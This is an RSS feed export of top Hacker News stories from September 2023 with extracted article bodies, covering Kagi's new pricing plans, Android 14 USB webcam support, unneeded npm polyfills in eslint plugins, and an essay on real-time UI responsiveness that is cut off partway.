<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 22 Sep 2023 02:00:10 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Unlimited Kagi searches for $10 per month (663 pts)]]></title>
            <link>https://blog.kagi.com/unlimited-searches-for-10</link>
            <guid>37603905</guid>
            <pubDate>Thu, 21 Sep 2023 20:32:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.kagi.com/unlimited-searches-for-10">https://blog.kagi.com/unlimited-searches-for-10</a>, See on <a href="https://news.ycombinator.com/item?id=37603905">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            
            <p><img src="https://assets.kagi.com/v1/kagi_assets/doggo/doggo_2.png" alt=""></p>

<p>This year has been extraordinary for <a href="https://kagi.com/">Kagi</a>. We had tremendous support from our customers, and we want to start this by taking a moment to say <strong>thank you</strong>. We really appreciate it.</p>

<p>Since we launched Kagi, our users have raved about the search quality, but many have stressed about the cost of search and having to change their search habits when switching from an ad-supported service, so we’re fixing that.&nbsp;</p>

<p>We’re thrilled to announce that <strong>unlimited search is now included in our $10/month Professional plan and our Ultimate, Family, and Duo plans</strong>.</p>

<blockquote>
<p>“When I first heard of Kagi (and saw the prices) I thought: this is the stupidest thing ever, jesus it’s priced for Silicon Valley bros.</p>

<p>Well, I just turned on yearly payments seconds ago… I guess it’s just that good?”</p>
</blockquote>

<p><em>Kagi Discord user, a couple of weeks ago - good news for this member :)</em></p>

<p>When we first <a href="https://blog.kagi.com/update-kagi-search-pricing">adjusted our pricing</a>, the search landscape was undergoing seismic shifts and brimming with uncertainty. The world watched as the emergence of powerful AI began rewriting the rules of search, and giants in the tech industry started a battle for dominance. It was a time of challenges and tough decisions for a small bootstrapped company like ours. We were determined to ensure Kagi was still around next year and remains a constant, reliable companion for your search needs.</p>

<p>Today, the tides are changing. With new search sources proving more cost-efficient, the improved efficiency of our infrastructure, and the broader market embracing Kagi, we can again offer an unlimited experience to a broader group of users. We’re excited that this change will let many more people enjoy a fun, ad-free, and user-centric web search.</p>

<p>Here is how the changes look through our membership plans.</p>

<h3>Professional Plan</h3>

<p>Kagi has one goal -  creating the most delightful search experience for our members. Starting today, enjoy unlimited searches with Kagi. For a mere $10/mo, step into the expansive world of Kagi’s renowned search quality and rich features, all crafted with you in mind.</p>

<p>Oh, and by the way, this also includes unlimited use of our <a href="https://kagi.com/summarizer/index.html">Universal Summarizer</a>, which can summarize unlimited-length documents, audio, and video!</p>

<p>As a part of this update, we are also introducing the annual payment option with 10% off!</p>

<blockquote>
<p>“For me Kagi represents an incredible accomplishment: the first search engine that gives better results than Google, respects privacy, offers <a href="https://help.kagi.com/kagi/features/website-info-personalized-results.html">customization</a> and so much more.</p>

<p>Thank you.”</p>
</blockquote>

<p><em>No, thank you, for supporting us!</em></p>

<h3>Starter Plan (formerly called Standard)</h3>

<p>This plan continues as our special introductory offer, designed for those ready to step beyond the free trial but still exploring whether the Professional plan aligns with their needs or fall into the category of most internet users who search just a few times a day on average.</p>

<p>We are removing the pay-per-use component (to simplify our billing infrastructure) and making it simple: 300 searches for $5/month. If a user hits this cap consistently, we recommend upgrading to unlimited searches at $10/month. This change also allows us to add the annual payment option at 10% off, which many of you requested.</p>

<blockquote>
<p>“3 months in - I find myself annoyed when I’m on a device that isn’t mine and I have to use google.”</p>
</blockquote>

<p><em>Same here, same here</em></p>

<h3 id="ultimate-plan">Ultimate Plan</h3>

<p>We’re aware that many of you used the Ultimate Plan for its access to unlimited searches. Starting today, we will be giving Ultimate Plan users access to the closed beta of the next generation of tools that Kagi is bringing to the web, and we’re targeting access for all our current Ultimate users in the next few days.</p>

<p>While we can not reveal yet what that is in detail as we’re still iterating quickly, no competitor comes close to the value proposition of this new feature suite. We would like you to help us better shape their future and join the fun!</p>

<p>When we release these new tools publicly, Ultimate users will have exclusive use of their most advanced features - ensuring your Kagi experience remains top of the line.</p>

<p>The Ultimate plan is also still the best way to support Kagi on its mission to humanize the web, and we are incredibly grateful to all of you who have chosen to do so.</p>

<blockquote>
<p>“The belief the search was better because they have so much history of me and such a strong ML team is why I kept using Google Search despite trying to get away from other Google products.
Kagi <a href="https://help.kagi.com/kagi/features/lenses.html">lenses</a> really do show how much it’s not true, and how much Google’s collection of my data isn’t actually returning on my data and privacy investment.”</p>
</blockquote>

<p><em>Turns out people know what they want better than algorithms do</em></p>

<p><a href="https://kagifeedback.org/assets/files/2023-09-21/1695322703-234286-screenshot-2023-09-21-at-115717.png"><img src="https://kagifeedback.org/assets/files/2023-09-21/1695322703-234286-screenshot-2023-09-21-at-115717.png" \=""></a>
</p><center><em>New Kagi Search Individual plans</em></center>

<h3>Family &amp; Duo Plans</h3>

<p>Family moments are precious, and we’re here to enrich them. Now, the whole family can explore a world of information together, with unlimited searches for $20/month (Family, up to six members) and $14/mo (Duo, for a couple).</p>

<p>We are inching closer to our vision where families can trust their search engine to prioritize their well-being over third parties and advertisers and where young minds grow uninfluenced by the data-hungry algorithms profiling them and changing their behavior.</p>

<p>Discover the joy of safe and ad-free search, nurturing curiosity without compromise. Learn more about the values that shape the <a href="https://blog.kagi.com/family-plan">Kagi Family plan</a>.</p>

<blockquote>
<p>“This sort of stuff makes me really happy to be a Kagi subscriber. Not only do I get value out of Kagi, but it shows me that the money is being used to develop Kagi in a way I agree with. By comparison, REDACTED (just picking one of my subs) feels hostile to me. I pay them, but I would cancel in a heartbeat if I felt I had options.
I really appreciate Kagi’s development matching what i feel like i’m buying. Thanks Kagi Team ”</p>
</blockquote>

<p><em>Awww, thank you! We'll keep on putting your money to good use</em></p>

<p><a href="https://kagifeedback.org/assets/files/2023-09-21/1695322702-804109-screenshot-2023-09-21-at-115735.png"><img src="https://kagifeedback.org/assets/files/2023-09-21/1695322702-804109-screenshot-2023-09-21-at-115735.png" \=""></a>
</p><center><em>New Kagi Search Family plans</em></center>

<h3>Frequently Asked Questions</h3>

<p>Q. <strong>How do I sign up?</strong><br>
A. Click <a href="https://kagi.com/onboarding?p=choose_plan">here</a> to become a member.</p>

<p>Q. <strong>Do I need to do anything to get the benefits of the new plans?</strong><br>
A. All changes will be automatic and applied to your account today.</p>

<p>Q. <strong>I do not have a credit card. Can I also pay for Kagi with PayPal or crypto?</strong><br>
A. Yes. We have recently added <a href="https://blog.kagi.com/accepting-paypal-bitcoin">new payment options</a> to allow payment through credit card, PayPal, and Bitcoin/Lightning through OpenNode.</p>

<p>Q. <strong>Now that I don’t have to count my searches, how can I switch all my browsers and devices to Kagi?</strong><br>
A. We have several options available. See <a href="https://help.kagi.com/kagi/getting-started/setting-default.html">here</a> for more details.</p>

<p>Q. <strong>I have an outstanding pay-per-use balance on my current Standard or Professional plan. What happens now?</strong><br>
A. Effective today, we are waiving all pending metered usage charges for you. Yahoo!</p>

<p>Q. <strong>I noticed that the Ultimate plan changed to 10% off for annual payments. I previously had 15% off. Do I remain locked in?</strong><br>
A. Yes, as long as you do not cancel, you will have the previous discount applied to your renewals.</p>

<p>Q. <strong>When do I get the new advanced features of the Ultimate plan?</strong><br>
A. We are starting to roll out access today in batches, and we expect to onboard all Ultimate plan users to new features by the end of the next week.</p>

<p>Q. <strong>How can I get the new Ultimate plan level features in the Family plan?</strong><br>
A. We haven’t established a mechanism to incorporate Ultimate plan features into the Family plan yet. However, we are open to suggestions and would appreciate any ideas you may have. Please share your thoughts at <a href="https://kagifeedback.org/">KagiFeedback.org</a>.</p>

<p>Q. <strong>Do I need to do anything with my grandfathered Early-adopter/Legacy Professional plan?</strong><br>
A. No. Additionally, we will be simplifying this over the next few days, as this is all the same Professional plan now. If you have the Early-Adopter flag, you will still keep it - we just didn’t have anything to tie it to right now, which does not mean we won’t in the future.</p>

<p>Q. <strong>I’m keen to support Kagi but concerned about its longevity, given the history of search startups. How can I be assured Kagi is here to stay?</strong><br>
A. What sets Kagi apart from other search engines is our fundamentally different, user-centric approach that prioritizes the interests of our members and the alignment of incentives. It’s worth noting that Kagi’s growth has been purely organic, without any expenditure on marketing or customer acquisition, attesting to the inherent value and trust our user base places in us and the growing need for better search.</p>

<p>We have priced our offering so that we do not rely financially on VC funding, data sales, or anything but our users’ contributions. We have had requests from our users to invest in Kagi, and we’re happy to offer that way to support us (see below).</p>

<p>We are striving to build a sustainable business, and we invite you to review our <a href="https://kagi.com/stats">live stats</a> for a transparent view of our steady progress. Your support matters, and we appreciate it a lot.</p>

<p>Q. <strong>How can I deepen my involvement with Kagi’s journey?</strong><br>
A. We are thrilled to hear of your interest! </p>

<p>Kagi is very open to collaboration, and we like to say that 50% of our product has been built by its members. We have a variety of ways you can <a href="https://help.kagi.com/kagi/support-and-community/contribute.html">get involved and contribute</a>. </p>

<p>We are also open to <a href="https://help.kagi.com/kagi/company/hiring-kagi.html">applications for positions</a> at Kagi. </p>

<p>If you’re already a Kagi user and are interested in becoming a shareholder, we’re considering <a href="https://blog.kagi.com/safe-round">another fundraiser</a> early next year. Please <a href="https://forms.gle/1Try2v6JtXbKSjKx9">get in touch</a>, and we will let you know once we are ready. </p>

<p>For other inquiries or simply to connect, join our <a href="https://kagi.com/discord">discord</a> or email Vladimir Prelovac (Kagi Founder) at <a href="mailto:vlad@kagi.com">vlad@kagi.com</a>.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A customer stuck due to a hurricane who needed SSH (112 pts)]]></title>
            <link>https://rachelbythebay.com/w/2023/09/21/hurricane/</link>
            <guid>37603554</guid>
            <pubDate>Thu, 21 Sep 2023 20:09:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rachelbythebay.com/w/2023/09/21/hurricane/">https://rachelbythebay.com/w/2023/09/21/hurricane/</a>, See on <a href="https://news.ycombinator.com/item?id=37603554">Hacker News</a></p>
Couldn't get https://rachelbythebay.com/w/2023/09/21/hurricane/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Android 14 adds support for using your smartphone as a webcam (154 pts)]]></title>
            <link>https://www.esper.io/blog/android-14-adds-support-for-using-your-smartphone-as-a-webcam</link>
            <guid>37603467</guid>
            <pubDate>Thu, 21 Sep 2023 20:04:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.esper.io/blog/android-14-adds-support-for-using-your-smartphone-as-a-webcam">https://www.esper.io/blog/android-14-adds-support-for-using-your-smartphone-as-a-webcam</a>, See on <a href="https://news.ycombinator.com/item?id=37603467">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Video conferencing platforms like Zoom and Google Meet exploded in popularity during the COVID era, but the webcam market struggled to keep up. The best webcams were hard to get or were too expensive, causing most people to turn to cheaper, more readily available webcams or their laptop’s integrated webcam. The camera in most smartphones offers significantly better image quality than the one found in the vast majority of webcams, though, so many people installed third-party software on their phones to turn them into webcams. Starting in <a href="https://blog.esper.io/android-14-deep-dive/">Android 14</a>, it may not be necessary to use a third-party app to turn your smartphone into a webcam for your PC, as that functionality is getting baked into the Android OS itself — though there’s a catch.</p><p>When you plug an Android phone into a PC, you have the option to change the USB mode between file transfer/Android Auto (MTP), USB tethering (NCM), MIDI, or PTP. In Android 14, however, a new option can appear in USB Preferences: USB webcam. Selecting this option switches the USB mode to UVC (USB Video Class), provided the device supports it, turning your Android device into a standard USB webcam that other devices will recognize, including Windows, macOS, and Linux PCs, and <a href="https://source.android.com/docs/core/camera/external-usb-cameras">possibly even other Android devices</a>.</p><figure><p><img src="https://assets-global.website-files.com/602d2f7be70ffc3452f5a079/64f7545560167bedc1f93ad3_Android_14_webcam_in_usb_preferences.png" loading="lazy" alt=""></p></figure><p>Webcam support in Android 14 is not enabled out of the box, however. In order to enable it, four things are required: a Linux kernel config needs to be enabled, the UVC device needs to be configured, the USB HAL needs to be updated, and a new system app needs to be preloaded.&nbsp;</p><h3><strong>Kernel config</strong></h3><p>The Linux kernel config (<a href="https://cateee.net/lkddb/web-lkddb/USB_CONFIGFS_F_UVC.html">CONFIG_USB_CONFIGFS_F_UVC</a>) is necessary so that the Android device can be mounted as a UVC gadget. Fortunately, many devices upgrading to and nearly all devices launching with Android 14 will have a kernel with this config enabled. This is because it is enabled by default on Generic Kernel Image (GKI) versions <a href="https://cs.android.com/android/_/android/kernel/common/+/8d5dd0a5a458f951f0fdc25aba0cb8329b121d51">starting from android12-5.10 and later</a>, and devices launching with Android 12 or later on top of Linux kernel version 5.10 or higher <a href="https://source.android.com/docs/core/architecture/kernel/generic-kernel-image#gki2">are required</a> to ship the GKI kernel.</p><p>Because major kernel version upgrades are rare in the Android space and since the <a href="https://blog.esper.io/android-dessert-bites-11-grf-323579/">Google Requirements Freeze (GRF) program</a> allows for older vendor implementations to still be certifiable, some devices upgrading to Android 14 won’t have kernels that support the USB webcam function. It’s hard to put together a list of such devices, so the best way to tell if your device is capable is to check its kernel version and whether the config is enabled.</p><p>To check your device’s kernel version, run:</p><p>‍</p><p>	adb shell “cat /proc/version”</p><p>‍</p><p>However, to actually verify that the kernel config is enabled, it’s necessary to run another command to see if “CONFIG_USB_CONFIGFS_F_UVC” appears in config.gz, a compressed copy of the configuration file used to build the kernel on the device.</p><p>‍</p><p>	adb shell "zcat /proc/config.gz | grep 'CONFIG_USB_CONFIGFS_F_UVC'"</p><p>‍</p><p>For example, here is the output from a Galaxy Z Fold 5 running Android 13. Since it is using the android13-5.15 GKI and since “CONFIG_USB_CONFIGFS_F_UVC=y”, it should be capable of supporting the USB webcam feature once it’s upgraded to Android 14. That’s assuming, though, that the device meets the other prerequisites I mentioned before.</p><figure><p><img src="https://assets-global.website-files.com/602d2f7be70ffc3452f5a079/64f75477809e9cc6e3d8c7f2_Galaxy_Z_Fold_5_kernel_and_UVC_config.png" loading="lazy" alt=""></p></figure><h3><strong>Webcam Service app</strong></h3><p>Within the Android 14 QPR1 beta for select Pixel devices is a new system app called “Webcam Service” (com.android.deviceaswebcam). This app relies on a shared library named libjni_deviceAsWebcam.so. This app and library are set to be included as part of Android 14’s upcoming source code release.</p><p>The Webcam Service app implements the “DeviceAsWebcam” service that <a href="https://twitter.com/MishaalRahman/status/1621194700790054914">I previously reported</a> would “[turn] an Android device into a webcam.” The service forwards camera frames to a /dev/video node that host devices can read from. <a href="https://android-review.googlesource.com/c/platform/system/sepolicy/+/2410788">SELinux policy</a> dictates that only processes in the device_as_webcam domain, ie. only the Webcam Service system app, can access the /dev/video nodes. Thus, only the device maker and not any third-party can actually take advantage of Android 14’s native USB webcam support.</p><p>How does the Webcam Service app actually know when to start forwarding camera frames? When the new “USB webcam” option in “USB Preferences” is toggled, the system broadcasts the android.hardware.usb.action.USB_STATE intent with the “connected” and “uvc” intent extras. Webcam Service has a receiver for this intent, which starts the system service if the “uvc” intent extra is set to “true” and the framework method android.hardware.usb#isUvcSupportEnabled() returns true.</p><p>The method isUvcSupportEnabled() returns true when the system property “ro.usb.uvc.enabled” is set to true. This property must be set by the OEM at build time, and if it is not set, then “USB Preferences” won’t show the “USB webcam” option and Webcam Service won’t start. This property is <a href="https://android-review.googlesource.com/c/platform/system/sepolicy/+/2415830">only readable by</a> system apps like Settings and the Webcam Service app.</p><p>When the Webcam Service starts, a new notification is posted that lets the user configure the webcam. Tapping the notification opens a camera preview where the user can zoom in or out or change lenses. Under the hood, the Webcam Service app starts a foreground service to ensure it is kept alive by the system. It uses the Camera2 API and supports streaming at either 720p (1280x720) or 1080p (1920x1080p) resolutions. The webcam device appears on the connected host as “Android Webcam”.</p><figure><p><img src="https://assets-global.website-files.com/602d2f7be70ffc3452f5a079/650b5a0741e33b9aefbf3f8b_Android_14_webcam_service_3.png" loading="lazy" alt=""></p></figure><h3><strong>ConfigFS and USB HAL</strong></h3><p>The exact encoding method, video parameters, and name displayed to the host depends on how the device maker sets up the UVC gadget using configfs. For example, on the Tensor-powered Pixel devices, Google’s UVC gadget function configuration can be found in the init.gs[101|201].usb.rc file located in /vendor/etc/init/hw.</p><figure><p><img src="https://assets-global.website-files.com/602d2f7be70ffc3452f5a079/64f7549e858c09450c069ea4_init.gs201.usb.rc.jpeg" loading="lazy" alt=""></p></figure><p>In addition, the device needs an updated USB HAL so that Android is able to switch USB modes to UVC when the option is selected in Settings. Due to the aforementioned GRF program, however, it’s likely that many devices upgrading to Android 14 won’t receive an updated USB HAL, meaning this feature won’t work.</p><h2>Conclusion</h2><p>It’s good to see Google implement native USB webcam functionality into Android. Assuming that the Webcam Service app will be available in AOSP as we expect, that means this feature can be picked up by any device maker that wishes to implement webcam functionality. Many will call this feature a clone of Apple’s “<a href="https://support.apple.com/en-us/HT213244">Continuity Camera</a>”, but it’s worth noting that Android’s version works with multiple platforms. Any phone running Android 14 that meets the requirements mentioned in this article can be turned into a standard USB webcam that works with any PC, and that’s a big deal.</p><p>‍</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LabelContactRelationYoungerCousinMothersSiblingsDaughterOrFathersSistersDaughter (135 pts)]]></title>
            <link>https://developer.apple.com/documentation/contacts/cnlabelcontactrelationyoungercousinmotherssiblingsdaughterorfatherssistersdaughter</link>
            <guid>37603331</guid>
            <pubDate>Thu, 21 Sep 2023 19:56:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://developer.apple.com/documentation/contacts/cnlabelcontactrelationyoungercousinmotherssiblingsdaughterorfatherssistersdaughter">https://developer.apple.com/documentation/contacts/cnlabelcontactrelationyoungercousinmotherssiblingsdaughterorfatherssistersdaughter</a>, See on <a href="https://news.ycombinator.com/item?id=37603331">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Speeding up the JavaScript ecosystem – Polyfills gone rogue (138 pts)]]></title>
            <link>https://marvinh.dev/blog/speeding-up-javascript-ecosystem-part-6/</link>
            <guid>37602923</guid>
            <pubDate>Thu, 21 Sep 2023 19:31:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://marvinh.dev/blog/speeding-up-javascript-ecosystem-part-6/">https://marvinh.dev/blog/speeding-up-javascript-ecosystem-part-6/</a>, See on <a href="https://news.ycombinator.com/item?id=37602923">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>📖 tl;dr: Many popular npm packages depend on 6-8x more packages than they need to. Most of these are unnecessary polyfills and it's one of the key reasons node_modules folders are so large. The eslint ecosystem seems to be most affected by this.</p><div>
						<p>In the previous posts we looked at runtime performance and I thought it would be fun to look at node modules install time instead. A lot has been already written about various algorithmic optimizations or using more performant syscalls, but why do we even have this problem in the first place? Why is every <code>node_modules</code> folders so big? Where are all these dependencies coming from?</p>
						<p>It all started when a buddy of mine noticed something odd with the dependency tree of his project. Whenever he updated a dependency, it would pull in several new ones and with each subsequent update the total number of dependencies grew over time.</p>
						<pre><code> ├─┬ arraybuffer.prototype.slice <span>1.0</span>.2<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ function.prototype.name <span>1.1</span>.6<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ globalthis <span>1.0</span>.3<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ object.assign <span>4.1</span>.4<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ regexp.prototype.flags <span>1.5</span>.1<br> │ ├─┬ define-properties <span>1.2</span>.1<br> │ │ └── define-data-property <span>1.1</span>.0<br> │ └─┬ set-function-name <span>2.0</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ string.prototype.trim <span>1.2</span>.8<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> ├─┬ string.prototype.trimend <span>1.0</span>.7<br> │ └─┬ define-properties <span>1.2</span>.1<br> │   └── define-data-property <span>1.1</span>.0<br> └─┬ string.prototype.trimstart <span>1.0</span>.7<br>   └─┬ define-properties <span>1.2</span>.1<br> 	└── define-data-property <span>1.1</span>.0</code></pre>
						<p>Now to be fair, there are valid reasons why a package might depend on an additional dependencies. Here, we began to notice a pattern though: The new dependencies were all polyfills for JavaScript functions that have long been supported everywhere. The <code>Object.defineProperties</code> method for example was shipped as part of the very first public Node <code>0.10.0</code> release dating back to 2013. Heck, even Internet Explorer 9 supported that. And yet there were numerous packages in that dependend on a polyfill for it.</p>
						<p>
							Among the various packages that pulled in <code>define-properties</code> was <a href="https://github.com/jsx-eslint/eslint-plugin-react/"><code>eslint-plugin-react</code></a>. It caught my eye, because it's very popular in the React ecosystem. Why does it pull in a polyfill for <code>Object.defineProperties</code>? There is no JavaScript engine that doesn't come with it already built in.
						</p>
						<h2>Polyfills that don’t polyfill</h2>
						<p>Reading the source of the packages revealed something even more bizarre: The polyfill functions were imported and called directly, rather than patching missing functionality in the runtime environment. The whole point of a polyfill is to be transparent to the user’s code. It should check if the function or method to patch is available and only add it if it’s missing. When there is no need for the polyfill it should do nothing. The odd thing to me is that the functions were used directly like a function from a library.</p>
						<pre><code><span>// Why is the `define` function imported directly?</span><br><span>var</span> define <span>=</span> <span>require</span><span>(</span><span>"define-properties"</span><span>)</span><span>;</span><br><span>// ...</span><p><span>// and even worse, why is called directly?</span><br><span>define</span><span>(</span>polyfill<span>,</span> <span>{</span><br>	<span>getPolyfill</span><span>:</span> getPolyfill<span>,</span><br>	<span>implementation</span><span>:</span> implementation<span>,</span><br>	<span>shim</span><span>:</span> shim<span>,</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
						<p>Instead they should call <code>Object.defineProperties</code> directly. The whole point of polyfills is to patch <em>the environment</em> not be called directly. Compare this to what a polyfill for <code>Object.defineProperties</code> is supposed to look like:</p>
						<pre><code><span>// Check if the current environment already supports</span><br><span>// `Object.defineProperties`. If it does, then we do nothing.</span><br><span>if</span> <span>(</span><span>!</span>Object<span>.</span>defineProperties<span>)</span> <span>{</span><br>	<span>// Patch in Object.defineProperties here</span><br><span>}</span></code></pre>
						<p>The most common place where <code>define-properties</code> was used was ironically inside other polyfills, which loaded even more polyfills. And before you ask, the <code>define-properties</code> package relies on even more dependencies than just itself.</p>
						<pre><code><span>var</span> keys <span>=</span> <span>require</span><span>(</span><span>"object-keys"</span><span>)</span><span>;</span><br><span>// ...</span><br><span>var</span> defineDataProperty <span>=</span> <span>require</span><span>(</span><span>"define-data-property"</span><span>)</span><span>;</span><br><span>var</span> supportsDescriptors <span>=</span> <span>require</span><span>(</span><span>"has-property-descriptors"</span><span>)</span><span>(</span><span>)</span><span>;</span><p><span>var</span> <span>defineProperties</span> <span>=</span> <span>function</span> <span>(</span><span>object<span>,</span> map</span><span>)</span> <span>{</span><br>	<span>// ...</span><br><span>}</span><span>;</span></p><p>module<span>.</span>exports <span>=</span> defineProperties<span>;</span></p></code></pre>
						<p>Inside <code>eslint-plugin-react</code>, that polyfill is loaded via a polyfill for <code>Object.entries()</code> to process <a href="https://github.com/jsx-eslint/eslint-plugin-react/blob/ecadb92609998520be80d64c0bd6bc5e05934aa9/configs/all.js#L4">their configuration</a>:</p>
						<pre><code><span>const</span> fromEntries <span>=</span> <span>require</span><span>(</span><span>"object.fromentries"</span><span>)</span><span>;</span> <span>// &lt;- Why is this used directly?</span><br><span>const</span> entries <span>=</span> <span>require</span><span>(</span><span>"object.entries"</span><span>)</span><span>;</span> <span>// &lt;- Why is this used directly?</span><br><span>const</span> allRules <span>=</span> <span>require</span><span>(</span><span>"../lib/rules"</span><span>)</span><span>;</span><p><span>function</span> <span>filterRules</span><span>(</span><span>rules<span>,</span> predicate</span><span>)</span> <span>{</span><br>	<span>return</span> <span>fromEntries</span><span>(</span><span>entries</span><span>(</span>rules<span>)</span><span>.</span><span>filter</span><span>(</span><span>entry</span> <span>=&gt;</span> <span>predicate</span><span>(</span>entry<span>[</span><span>1</span><span>]</span><span>)</span><span>)</span><span>)</span><span>;</span><br><span>}</span></p><p><span>const</span> activeRules <span>=</span> <span>filterRules</span><span>(</span>allRules<span>,</span> <span>rule</span> <span>=&gt;</span> <span>!</span>rule<span>.</span>meta<span>.</span>deprecated<span>)</span><span>;</span></p></code></pre>
						<h2>Doing a little bit of housekeeping</h2>
						<p>At the time of this writing installing <code>eslint-plugin-react</code> pulls in a whopping number of 97 dependencies in total. I was curious about how much of these were polyfills and began patching them out one by one locally. After all was done, this brought down the total number of dependencies down to 15. Out of the original 97 dependencies 82 of them are not needed.</p>
						<p>Coincidentally, <code>eslint-plugin-import</code> which is equally popular in various eslint presets, shows a similar problems. Installing that fills up your <code>node_modules</code> folder with 87 packages. After another local cleanup pass I was able to cut down that number to just 17.</p>
						<h2>Filling up everyone's disk space</h2>
						<p>Now you might be wondering if you’re affected or not. I did a quick search and basically every widely popular eslint plugin or preset that you can think of is affected. For some reason this whole ordeal reminds me of the <code>is-even</code>/<code>is-odd</code> incident the industry had a while back.</p>
						<p>Having so many dependencies makes it much harder to audit the dependencies of a project. It's a waste of space too. Case in point: Deleting all eslint plugins and presets in a project alone got rid of <code>220</code> packages.</p>
						<pre><code><span>pnpm</span> <span>-r</span> <span>rm</span> eslint-plugin-react eslint-plugin-import eslint-import-resolver-typescript eslint-config-next eslint @typescript-eslint/parser @typescript-eslint/eslint-plugin eslint-plugin-prettier prettier eslint-config-prettier eslint-plugin-react-hooks<br>Scope: all <span>8</span> workspace projects<br><span>.</span>                                        <span>|</span> <span>-220</span> ----------------------</code></pre>
						<p>Maybe we don't need that many dependencies in the first place. My mind went to this fantastic quote by the creator of the Erlang programming language:</p>
						<blockquote>
							<p>You wanted a banana but what you got was a gorilla holding the banana and the entire jungle - Joe Armstrong</p>
						</blockquote>
						<p>All I wanted was some linting rules. I didn’t want a bunch of polyfills that I don't need.</p>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NASA’s Webb finds carbon source on surface of Jupiter’s moon Europa (281 pts)]]></title>
            <link>https://webbtelescope.org/contents/news-releases/2023/news-2023-113</link>
            <guid>37602239</guid>
            <pubDate>Thu, 21 Sep 2023 18:52:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webbtelescope.org/contents/news-releases/2023/news-2023-113">https://webbtelescope.org/contents/news-releases/2023/news-2023-113</a>, See on <a href="https://news.ycombinator.com/item?id=37602239">Hacker News</a></p>
Couldn't get https://webbtelescope.org/contents/news-releases/2023/news-2023-113: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Most UI applications are broken real-time applications (110 pts)]]></title>
            <link>https://thelig.ht/ui-apps-are-broken/</link>
            <guid>37601064</guid>
            <pubDate>Thu, 21 Sep 2023 17:34:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thelig.ht/ui-apps-are-broken/">https://thelig.ht/ui-apps-are-broken/</a>, See on <a href="https://news.ycombinator.com/item?id=37601064">Hacker News</a></p>
<div id="readability-page-1" class="page">

<p>I’ve been programming for a long time. When I say long time, I mean
decades, with an S. Hopefully that’s long enough. In that time my
experience has primarily been programming for contemporary platforms,
e.g.&nbsp;Linux, Windows, macOS on desktop-class or server-class CPU
architectures. Recently, I embarked on building a <a href="https://www.supermidipak.com/">MIDI engine for a system with
significantly less processing power</a>.</p>
<p>Soon after I started, I ran into the issue of guaranteeing that it
was impossible for the queue of input events to build up indefinitely.
This essentially boils down to making sure that each event handler
doesn’t run longer than some maximum amount. Then it hit me, I’ve heard
this before, <em>maximum amount of time</em>: I’m building a real-time
system.</p>
<p>Once I realized that I had to additionally take real-time constraints
into account while building, it drove a lot of the engineering decisions
I made in a specific direction. In particular, the worst case time of
every sequence of code must be accounted for, the average-case time was
irrelevant for correctness. Under this discipline, algorithms which had
better worst-case time but worse average-case time are preferred,
branching usually must be to the faster path, and adding fast paths to
slow algorithms was not helpful. It was interesting work and it changed
how I thought about building systems in a profound way.</p>
<p>Armed with this new awareness, I began to notice the lack of
real-time discipline in other applications, including my own. This was a
jarring experience, how could I have never noticed this before? The
juggernaut during this period was when I realized that most mainstream
desktop UI applications were <em>fundamentally broken</em>.</p>
<p>When I click a mouse button, when I press a key on the keyboard, I
expect a response in a bounded amount of time. <em>Bounded amount of
time?</em> We’ve heard this before! UI applications are also real-time
systems. How much time is this bounded amount of time? 100ms or maybe
250ms. Well, take your pick, the key point is that the response time
should not be indefinite. I should never see a <strong>beach ball of
death</strong>. <em>Never</em>.</p>
<h2 id="library-functions-are-not-real-time">Library Functions are not
Real-time</h2>
<p>One of the fundamental problems is that many UI applications on
Windows, Linux, and macOS call functions that are not specified to run
in a bounded amount of time. Here’s a basic example: many applications
don’t think twice about doing file IO in a UI event handler. That
results in a tolerable amount of latency most of the time on standard
disk drives but what if the file is stored on a network drive? It could
take much longer than a second to service the file request. This will
result in a temporarily hung application with the user not knowing what
is happening. The network drive is operating correctly, the UI
application isn’t.</p>
<p>So all we have to do is avoid file system IO functions from the main
thread? Not a big deal. That doesn’t mean UI applications are
fundamentally broken. That’s just one broken application and it’s still
relatively easily fixable.</p>
<p>It’s not just file system IO functions. File system IO functions
belong to a class of functions called blocking functions. These are
functions that are specified not to return until some external event
happens. So correct UI applications cannot call any blocking function
from their main threads.</p>
<p>It gets worse. Literally none of the standard library functions on
contemporary systems are guaranteed to return in any amount of time. If
you want to write a correct UI application, you technically cannot call
any of them. I’m talking <code>malloc()</code>. Each call risks taking
an amount of time longer than the maximum time allotted to respond to
the event.</p>
<p>You may think I am being excessively pedantic with the previous
point. Maybe you think, “No sane implementation of any standard library
